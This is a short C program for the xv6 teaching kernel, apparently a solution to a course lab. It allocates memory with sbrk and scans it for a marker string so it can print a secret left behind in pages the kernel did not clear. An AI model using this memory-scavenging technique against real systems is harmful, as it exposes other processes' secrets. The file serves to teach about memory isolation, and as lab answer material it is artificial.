#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"
#include "kernel/stat.h"

#define NPAGES 64
#define SIZE (NPAGES * PGSIZE)

#define MARKER " help."
#define MARKER_LEN 6
#define SECRET_OFFSET 8

static int
isalnum_char(char c)
{
  return (c >= '0' && c <= '9') ||
         (c >= 'A' && c <= 'Z') ||
         (c >= 'a' && c <= 'z');
}

int
main(int argc, char *argv[])
{
  char *mem = sbrk(SIZE);

  if(mem == (char *)-1){
    printf("attack: sbrk failed\n");
    exit(1);
  }

  for(int i = 0;
      i + SECRET_OFFSET < SIZE;
      i++){

    if(memcmp(mem + i, MARKER, MARKER_LEN) != 0)
      continue;

    char *candidate = mem + i + SECRET_OFFSET;

    int len = 0;

    while(i + SECRET_OFFSET + len < SIZE &&
          isalnum_char(candidate[len])){
      len++;
    }

    if(len > 0 &&
       i + SECRET_OFFSET + len < SIZE &&
       candidate[len] == '\0'){
      write(1, candidate, len);
      write(1, "\n", 1);
      exit(0);
    }
  }

  exit(0);
}